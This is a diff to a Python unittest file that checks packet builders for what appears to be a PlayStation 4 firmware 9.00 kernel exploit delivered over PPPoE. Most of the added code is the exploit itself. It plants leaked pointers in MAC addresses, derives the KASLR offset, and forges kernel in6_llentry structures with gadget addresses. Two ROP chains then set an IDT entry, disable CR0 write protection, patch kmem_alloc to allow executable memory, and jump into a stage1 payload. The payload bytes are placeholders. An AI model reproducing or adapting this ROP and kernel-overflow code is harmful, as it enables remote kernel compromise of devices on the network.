@@ -7,6 +7,8 @@ from scapy.layers.inet6 import *
 from scapy.layers.ppp import *
 from scapy.utils import hexdump
 
+from offsets import *
+
 # PPPoE constants
 
 PPPOE_TAG_HUNIQUE = 0x0103
@@ -154,6 +156,7 @@ class TestPacket(unittest.TestCase):
 
     def setUp(self):
         self.init(b'\x00\x96\xb9\x3c\x6a\xdf\xff\xff',
+                  b'\xf8\x11\x2e\xcc\xff\xff\xff\xff',
                   b'2c:cc:44:33:22:11',
                   b'fe80::22ff:44ff:ee66:cc88')
 
@@ -168,12 +171,16 @@ class TestPacket(unittest.TestCase):
             hexdump(bytes(packet))
             raise e
 
-    def run_exploit(self):
-        self.lib.setInterface(c_char_p(b"en10"))
-        self.lib.setFirmwareVersion(900)
-        print("failed" if self.lib.run() else "success")
+    def kdlsym(self, addr):
+        return self.kaslr_offset + addr
 
     def build_fake_ifnet(self):
+        # Leak address
+        # Upper bytes are encoded with SESSION_ID
+        planted = (self.pppoe_softc + 0x07) & 0xffffffffffff
+        self.source_mac = str2mac(planted.to_bytes(6, byteorder='little'))
+        print('[+] Source MAC: {}'.format(self.source_mac))
+
         # Fake ifnet
         fake_ifnet = bytearray()
 
@@ -243,18 +250,244 @@ class TestPacket(unittest.TestCase):
 
         return overflow_lle
 
-    def init(self, uniq, ps4_mac, target_ipv6):
+    def build_fake_lle(self):
+        # First gadget - must be a valid MAC address
+        # Upper bytes are encoded with SESSION_ID
+        planted = self.kdlsym(self.offs.FIRST_GADGET) & 0xffffffffffff
+        self.source_mac = str2mac(planted.to_bytes(6, byteorder='little'))
+        print('[+] Source MAC: {}'.format(self.source_mac))
+
+        # Fake in6_llentry
+        fake_lle = bytearray()
+
+        # lle_next
+        # Third gadget
+        fake_lle += p64(
+            self.kdlsym(self.offs.POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10)
+        )  # le_next
+        fake_lle += p64(NULL)  # le_prev
+
+        # lle_lock
+        # Fourth gadget
+        fake_lle += p64(self.kdlsym(
+            self.offs.LEA_RSP_RSI_20_REPZ_RET))  # lo_name
+        fake_lle += p32(RW_INIT_FLAGS | LO_DUPOK)  # lo_flags
+        fake_lle += p32(0)  # lo_data
+        # Fifth gadget
+        fake_lle += p64(self.kdlsym(
+            self.offs.ADD_RSP_B0_POP_RBP_RET))  # lo_witness
+        fake_lle += p64(RW_UNLOCKED)  # rw_lock
+
+        fake_lle += p64(self.pppoe_softc + PPPOE_SOFTC_SC_DEST -
+                        LLTABLE_LLTFREE)  # lle_tbl
+        fake_lle += p64(NULL)  # lle_head
+        fake_lle += p64(NULL)  # lle_free
+        fake_lle += p64(NULL)  # la_hold
+        fake_lle += p32(0)  # la_numheld
+        fake_lle += p32(0)  # pad
+        fake_lle += p64(0)  # la_expire
+        fake_lle += p16(LLE_STATIC | LLE_EXCLUSIVE)  # la_flags
+        fake_lle += p16(0)  # la_asked
+        fake_lle += p16(0)  # la_preempt
+        fake_lle += p16(0)  # ln_byhint
+        fake_lle += p16(ND6_LLINFO_NOSTATE)  # ln_state
+        fake_lle += p16(0)  # ln_router
+        fake_lle += p32(0)  # pad
+        fake_lle += p64(0x7fffffffffffffff)  # ln_ntick
+        fake_lle += p32(0)  # lle_refcnt
+        fake_lle += p32(0)  # pad
+        fake_lle += p64be(0x414141414141)  # ll_addr
+
+        # lle_timer
+        fake_lle += p64(0)  # sle
+        fake_lle += p64(0)  # tqe
+        fake_lle += p32(0)  # c_time
+        fake_lle += p32(0)  # pad
+        fake_lle += p64(NULL)  # c_arg
+        fake_lle += p64(NULL)  # c_func
+        fake_lle += p64(NULL)  # c_lock
+        fake_lle += p32(CALLOUT_RETURNUNLOCKED)  # c_flags
+        fake_lle += p32(0)  # c_cpu
+
+        # l3_addr6
+        fake_lle += p8(SOCKADDR_IN6_SIZE)  # sin6_len
+        fake_lle += p8(AF_INET6)  # sin6_family
+        fake_lle += p16(0)  # sin6_port
+        fake_lle += p32(0)  # sin6_flowinfo
+        # sin6_addr
+        fake_lle += p64be(0xfe80000100000000)
+        fake_lle += p64be(0x4141414141414141)
+        fake_lle += p32(0)  # sin6_scope_id
+
+        # pad
+        fake_lle += p32(0)
+
+        # Second gadget
+        fake_lle[self.offs.SECOND_GADGET_OFF:(
+                self.offs.SECOND_GADGET_OFF + 8)] = p64(
+            self.kdlsym(self.offs.PUSH_RBP_JMP_QWORD_PTR_RSI))
+
+        # Second ROP chain
+        rop2 = self.build_second_rop()
+
+        # First ROP chain
+        rop = self.build_first_rop(fake_lle, rop2)
+
+        return fake_lle + rop + rop2 + self.stage1
+
+    def build_first_rop(self, fake_lle, rop2):
+        rop = bytearray()
+
+        # memcpy(RBX - 0x800, rop2, len(rop2 + stage1))
+
+        # RDI = RBX - 0x800
+        rop += p64(self.kdlsym(self.offs.POP_R12_RET))
+        rop += p64(self.kdlsym(self.offs.POP_RBP_RET))
+        rop += p64(self.kdlsym(self.offs.MOV_RDI_RBX_CALL_R12))
+        rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
+        rop += p64(-0x800)
+        rop += p64(self.kdlsym(self.offs.ADD_RDI_RCX_RET))
+
+        # RSI += len(fake_lle + rop)
+        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
+        rop_off_fixup = len(rop)
+        rop += p64(0xDEADBEEF)
+        rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET))
+        rop += p64(0xDEADBEEF)
+
+        # RDX = len(rop2 + stage1)
+        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
+        rop += p64(len(rop2 + self.stage1))
+
+        # Call memcpy
+        rop += p64(self.kdlsym(self.offs.MEMCPY))
+
+        # Stack pivot
+        rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
+        rop += p64(self.kdlsym(self.offs.POP_RBP_RET))
+        rop += p64(self.kdlsym(self.offs.MOV_RSI_RBX_CALL_RAX))
+        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
+        rop += p64(0x800 + 0x20)
+        rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET))
+        rop += p64(0xDEADBEEF)
+        rop += p64(self.kdlsym(self.offs.LEA_RSP_RSI_20_REPZ_RET))
+
+        # Fixup offset of rop2
+        rop[rop_off_fixup:rop_off_fixup + 8] = p64(-len(fake_lle + rop))
+
+        return rop
+
+    def build_second_rop(self):
+        rop = bytearray()
+
+        # setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0)
+        rop += p64(self.kdlsym(self.offs.POP_RDI_RET))
+        rop += p64(IDT_UD)
+        rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
+        rop += p64(self.kdlsym(self.offs.ADD_RSP_28_POP_RBP_RET))
+        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
+        rop += p64(SDT_SYSIGT)
+        rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
+        rop += p64(SEL_KPL)
+        rop += p64(self.kdlsym(self.offs.POP_R8_POP_RBP_RET))
+        rop += p64(0)
+        rop += p64(0xDEADBEEF)
+        rop += p64(self.kdlsym(self.offs.SETIDT))
+
+        # Disable write protection
+        rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
+        rop += p64(CR0_ORI & ~CR0_WP)
+        rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET))
+
+        # Enable RWX in kmem_alloc
+        rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
+        rop += p64(VM_PROT_ALL)
+        rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
+        rop += p64(self.kdlsym(self.offs.KMEM_ALLOC_PATCH1))
+        rop += p64(self.kdlsym(self.offs.MOV_BYTE_PTR_RCX_AL_RET))
+        rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
+        rop += p64(self.kdlsym(self.offs.KMEM_ALLOC_PATCH2))
+        rop += p64(self.kdlsym(self.offs.MOV_BYTE_PTR_RCX_AL_RET))
+
+        # Restore write protection
+        rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
+        rop += p64(CR0_ORI)
+        rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET))
+
+        # kmem_alloc(*kernel_map, PAGE_SIZE)
+
+        # RDI = *kernel_map
+        rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
+        rop += p64(self.kdlsym(self.offs.RET))
+        rop += p64(self.kdlsym(self.offs.POP_RDI_RET))
+        rop += p64(self.kdlsym(self.offs.KERNEL_MAP))
+        rop += p64(self.kdlsym(self.offs.MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX))
+        rop += p64(0xDEADBEEF)
+
+        # RSI = PAGE_SIZE
+        rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
+        rop += p64(PAGE_SIZE)
+
+        # Call kmem_alloc
+        rop += p64(self.kdlsym(self.offs.KMEM_ALLOC))
+
+        # R14 = RAX
+        rop += p64(self.kdlsym(self.offs.POP_R8_POP_RBP_RET))
+        rop += p64(self.kdlsym(self.offs.POP_RBP_RET))
+        rop += p64(0xDEADBEEF)
+        rop += p64(self.kdlsym(self.offs.MOV_R14_RAX_CALL_R8))
+
+        # memcpy(R14, stage1, len(stage1))
+
+        # RDI = R14
+        rop += p64(self.kdlsym(self.offs.POP_R12_RET))
+        rop += p64(self.kdlsym(self.offs.POP_RBP_RET))
+        rop += p64(self.kdlsym(self.offs.MOV_RDI_R14_CALL_R12))
+
+        # RSI = RSP + len(rop) - rop_rsp_pos
+        rop += p64(self.kdlsym(self.offs.PUSH_RSP_POP_RSI_RET))
+        rop_rsp_pos = len(rop)
+        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
+        rop_off_fixup = len(rop)
+        rop += p64(0xDEADBEEF)
+        rop += p64(self.kdlsym(self.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET))
+        rop += p64(0xDEADBEEF)
+
+        # RDX = len(stage1)
+        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
+        rop += p64(len(self.stage1))
+
+        # Call memcpy
+        rop += p64(self.kdlsym(self.offs.MEMCPY))
+
+        # Jump into stage1
+        rop += p64(self.kdlsym(self.offs.JMP_R14))
+
+        # Fixup offset of stage1
+        rop[rop_off_fixup:rop_off_fixup + 8] = p64(-(len(rop) - rop_rsp_pos))
+
+        return rop
+
+    def init(self, uniq, softc_list, ps4_mac, target_ipv6):
         self.host_uniq = uniq
         self.pppoe_softc = unpack('<Q', self.host_uniq)[0]
-        planted = (self.pppoe_softc + 0x07) & 0xffffffffffff
-        self.source_mac = str2mac(planted.to_bytes(6, byteorder='little'))
+        self.source_mac = SOURCE_MAC
         self.target_mac = ps4_mac.decode()
         self.target_ipv6 = target_ipv6.decode()
+        self.offs = OffsetsFirmware_900()
+        self.pppoe_softc_list = unpack('<Q', softc_list)[0]
+        self.kaslr_offset = self.pppoe_softc_list - self.offs.PPPOE_SOFTC_LIST
+        self.stage1 = b'B' * 123
+        self.stage2 = b'C' * 456
 
+        self.lib.setStage1(c_char_p(self.stage1), len(self.stage1))
+        self.lib.setStage2(c_char_p(self.stage2), len(self.stage2))
+        self.lib.setFirmwareVersion(c_uint32(900))
         self.lib.setSourceMac(c_char_p(self.source_mac.encode()))
         self.lib.setTargetMac(c_char_p(self.target_mac.encode()))
         self.lib.setTargetIpv6(c_char_p(self.target_ipv6.encode()))
         self.lib.setPppoeSoftc(c_uint64(self.pppoe_softc))
+        self.lib.setKaslrOffset(c_uint64(self.kaslr_offset))
         self.buffer_size = 4096
         self.buffer = (c_uint8 * self.buffer_size)()
 
@@ -262,13 +495,64 @@ class TestPacket(unittest.TestCase):
         c_packet_len = getattr(self.lib, function_name)(self.buffer, c_uint64(self.buffer_size), *args)
         return bytes(self.buffer[i] for i in range(c_packet_len))
 
-    def test_pado(self):
-        c_packet = self.call_c_function("buildPado")
+    def test_fake_ifnet(self):
+        c_packet = self.call_c_function("buildFakeIfnet")
+        packet = self.build_fake_ifnet()
+        self.check(c_packet, packet)
+
+    def test_overflow_lle(self):
+        c_packet = self.call_c_function("buildOverflowLle")
+        packet = self.build_overflow_lle()
+        self.check(c_packet, packet)
+
+    def test_second_top(self):
+        c_packet = self.call_c_function("buildSecondRop")
+        packet = self.build_second_rop()
+        self.check(c_packet, packet)
+
+    def test_fake_lle(self):
+        c_packet = self.call_c_function("buildFakeLle")
+        packet = self.build_fake_lle()
+        self.check(c_packet, packet)
+
+    def test_pado_fake_ifnet(self):
+        data_buffer_size = 4096
+        data_buffer = (c_uint8 * data_buffer_size)()
+
+        c_packet_len = self.lib.buildFakeIfnet(data_buffer, c_uint64(data_buffer_size))
+        c_packet = self.call_c_function("buildPado", data_buffer, c_packet_len)
+        cookie = self.build_fake_ifnet()
         packet = Ether(src=self.source_mac,
                        dst=self.target_mac,
                        type=ETHERTYPE_PPPOEDISC) / \
                  PPPoED(code=PPPOE_CODE_PADO) / \
-                 PPPoETag(tag_type=PPPOE_TAG_ACOOKIE, tag_value=self.build_fake_ifnet()) / \
+                 PPPoETag(tag_type=PPPOE_TAG_ACOOKIE, tag_value=cookie) / \
+                 PPPoETag(tag_type=PPPOE_TAG_HUNIQUE, tag_value=p64(self.pppoe_softc))
+        self.check(c_packet, packet)
+
+    def test_pado_fake_lle(self):
+        data_buffer_size = 4096
+        data_buffer = (c_uint8 * data_buffer_size)()
+
+        c_packet_len = self.lib.buildFakeLle(data_buffer, c_uint64(data_buffer_size))
+        c_packet = self.call_c_function("buildPado", data_buffer, c_packet_len)
+        cookie = self.build_fake_lle()
+        packet = Ether(src=self.source_mac,
+                       dst=self.target_mac,
+                       type=ETHERTYPE_PPPOEDISC) / \
+                 PPPoED(code=PPPOE_CODE_PADO) / \
+                 PPPoETag(tag_type=PPPOE_TAG_ACOOKIE, tag_value=cookie) / \
+                 PPPoETag(tag_type=PPPOE_TAG_HUNIQUE, tag_value=p64(self.pppoe_softc))
+        self.check(c_packet, packet)
+
+    def test_pado_empty_cookie(self):
+        data_buffer = (c_uint8 * 2)()
+        c_packet = self.call_c_function("buildPado", data_buffer, 0)
+        packet = Ether(src=self.source_mac,
+                       dst=self.target_mac,
+                       type=ETHERTYPE_PPPOEDISC) / \
+                 PPPoED(code=PPPOE_CODE_PADO) / \
+                 PPPoETag(tag_type=PPPOE_TAG_ACOOKIE, tag_value=b'') / \
                  PPPoETag(tag_type=PPPOE_TAG_HUNIQUE, tag_value=p64(self.pppoe_softc))
         self.check(c_packet, packet)
 
@@ -277,6 +561,12 @@ class TestPacket(unittest.TestCase):
         packet = Ether(src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOEDISC) / \
                  PPPoED(code=PPPOE_CODE_PADS, sessionid=SESSION_ID) / \
                  PPPoETag(tag_type=PPPOE_TAG_HUNIQUE, tag_value=p64(self.pppoe_softc))
+        self.check(c_packet, packet)
+
+    def test_padt(self):
+        c_packet = self.call_c_function("buildPadt")
+        packet = Ether(src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOEDISC) / \
+                 PPPoED(code=PPPOE_CODE_PADT, sessionid=SESSION_ID)
         self.check(c_packet, packet)
 
     def test_lcp_request(self):
@@ -369,6 +659,14 @@ class TestPacket(unittest.TestCase):
                  PPPoE(sessionid=session_id) / \
                  PPP() / \
                  PPP_LCP_Echo(code=ECHO_REPLY, id=reply_id)
+        self.check(c_packet, packet)
+
+    def test_lcp_terminate(self):
+        c_packet = self.call_c_function("buildLcpTerminate")
+        packet = Ether(src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE) / \
+                 PPPoE(sessionid=SESSION_ID) / \
+                 PPP() / \
+                 PPP_LCP_Terminate()
         self.check(c_packet, packet)
 
 
